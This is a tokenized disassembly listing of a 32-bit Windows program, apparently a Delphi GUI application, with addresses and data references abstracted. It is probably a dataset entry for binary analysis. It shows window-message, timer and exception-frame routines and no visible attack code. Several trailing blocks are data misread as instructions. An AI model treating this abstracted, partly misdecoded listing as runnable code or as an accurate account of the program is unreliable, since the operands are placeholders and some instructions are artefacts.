mov eax [ rw-data ]
call sub_45afd8
sub_456cc3
jmp sub_403960
sub_456cca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ced
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d428
retn
sub_456ce6
jmp sub_403960
sub_456ced
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456eac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456c1c
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_457114
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_44eedc
sub_4571ff
jmp sub_403960
sub_457206
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45720c
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_4569f4
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_457264
call sub_457f8c
retn
sub_4576b1
jmp sub_403960
sub_4576b8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036ac#7
jmp sub_4036ac
j_sub_4036ac#6
jmp sub_4036ac
sub_457e49
jmp sub_403960
sub_457e50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e6d
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
sub_457e66
jmp sub_403960
sub_457e6d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457e74
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_4215f4
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4548bc
sub_457e94
call sub_403224
retn
sub_457eec
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_457f52
jmp sub_403960
j_sub_4036ac#5
jmp sub_4036ac
sub_45812c
xor edx edx
call sub_454c20
retn
sub_458134
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_454c20
mov eax ebx
call sub_43be2c
pop ebx
retn
sub_4581ba
jmp sub_403960
sub_4581c1
pop ebx
pop ecx
pop ebp
retn
sub_4581c8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_4423cc
push eax
call PostMessageA
pop ebx
retn
sub_4583cc
jmp sub_403960
sub_45846d
jmp sub_403960
sub_458477
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458496
mov eax [ rw-data ]
call sub_45a6b0
retn
sub_45848f
jmp sub_403960
sub_458496
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4584b3
lea eax [ ebp - 0x20 ]
call sub_403f5c
retn
sub_4584ac
jmp sub_403960
sub_4584b3
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458594
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43afd8
retn
mov edx eax
mov eax [ rw-data ]
call sub_459d04
retn
sub_458918
mov edx eax
mov eax [ rw-data ]
call sub_45b724
mov al 0x1
retn
sub_458a00
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_458928
sub_458a14
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_458928
sub_458a28
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_458928
sub_458a3c
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_458928
sub_458a50
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_458bbb
jmp sub_403960
sub_458bc2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458bc8
push ebx
mov ebx eax
mov eax ebx
call sub_440ce4
mov eax ebx
call sub_440e68
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4581c8
sub_458e3e
jmp sub_403960
sub_458e45
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458e4c
push ebx
mov ebx edx
mov edx ebx
call sub_44114c
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43b0e0
pop ebx
retn
sub_458ea0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_458f08
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_458eb8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_458f08
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_458ed4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_458f08
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_458eec
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_458f08
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_459188
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_459194
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4591a0
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4591ac
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4591b8
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4591c4
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4591d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_413918
pop esi
pop ebx
retn
sub_4591e4
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_459200
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413918
pop esi
pop ebx
retn
sub_459214
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45921c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413918
pop esi
pop ebx
retn
sub_459230
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45930c
mov eax [ eax + 0x54 ]
call sub_4137bc
retn
sub_459318
mov eax [ eax + 0x54 ]
call sub_413a5c
retn
sub_45956b
jmp sub_403960
sub_4595af
jmp sub_403960
sub_4595b6
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_459604
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_459404
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403fb0
pop esi
pop ebx
retn
sub_459670
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_413918
pop esi
pop ebx
retn
sub_459684
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_459889
jmp sub_403960
sub_459890
pop ebx
mov esp ebp
pop ebp
retn
sub_459898
inc [ eax + 0x8c ]
retn
sub_4598a0
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_4598c0
sub_4598c0
xor edx edx
call sub_459d04
retn
sub_459cf6
jmp sub_403960
sub_459d7d
jmp sub_403960
sub_459d8c
add eax 0x30
call sub_40ccd0
retn
sub_459dd0
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_4036ac#4
jmp sub_4036ac
sub_459e26
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_45b724
call sub_403a14
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
j_sub_403960#8
jmp sub_403960
sub_45a4fc
pop ebx
mov esp ebp
pop ebp
retn
sub_45a684
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45a6b0
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45a6dc
xor edx edx
call sub_45a5d4
retn
sub_45a6e4
mov dl 0x1
call sub_45a5d4
retn
sub_45a758
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45a770
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
j_sub_403960#7
jmp sub_403960
sub_45a844
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036ac#3
jmp sub_4036ac
sub_45b58c
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_4036ac#2
jmp sub_4036ac
sub_45b6c9
jmp sub_4036ac
sub_45b702
jmp sub_403960
sub_45b709
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b710
call sub_40c820
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
j_sub_403960#6
jmp sub_403960
sub_45b910
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45b9d7
jmp sub_403960
sub_45b9de
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45bbb4
jmp sub_403960
sub_45bbbb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403960#5
jmp sub_403960
sub_45bc23
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bc2c
call sub_45b9f4
retn
j_sub_4036ac
jmp sub_4036ac
sub_45be70
jmp sub_403960
sub_45be77
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403960#9
jmp sub_403960
sub_45c104
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45c403
jmp sub_403960
j_sub_403960#4
jmp sub_403960
j_sub_403960#3
jmp sub_403960
sub_45c545
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45c8d6
jmp sub_403960
sub_45c8dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ca00
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45ca4b
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_45ca5c
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_45ca6c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
j_sub_403960#2
jmp sub_403960
sub_45cae6
pop ebp
retn
sub_45cae8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45ca7c
call sub_403d30
call sub_45ca00
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_4527ac
call sub_41340c
sub_45dadc
xchg esp eax
int3
sub_461d1f
0x65bfe8e8 0x3c6d
sub_461ff2
lodsb [ esi ]
int3
sub_4628c9
jmp sub_403960
sub_4628d0
pop ebp
retn
sub_462a69
jmp sub_403960
sub_462a70
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403960
jmp sub_403960
sub_462af2
pop ebp
retn
sub_462cc0
mov edx cs
inc ebp
add ah dl
sub [ esi ] al
movsb [ edi ] [ esi ]
sub [ esi ] al
add [ eax ] al
add [ eax ] al
int3
